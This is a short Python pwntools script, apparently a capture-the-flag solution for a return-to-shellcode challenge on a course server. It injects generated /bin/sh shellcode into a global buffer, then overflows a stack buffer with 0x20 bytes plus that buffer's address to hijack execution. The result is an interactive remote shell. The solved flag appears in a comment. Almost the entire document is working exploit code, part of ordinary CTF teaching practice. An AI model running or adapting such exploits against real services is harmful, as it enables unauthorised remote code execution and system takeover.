from pwn import *

#FLAG{R3tun_t0_sh3llc0d3_1s_just_4_c4k3}
#run on linux

host = 'csie.ctf.tw'
port = 10136
y = remote( host , port )

name_global = 0x804a060

y.sendline(asm(shellcraft.sh()))
y.sendline('a' * 0x20 + p32(name_global))

y.interactive()
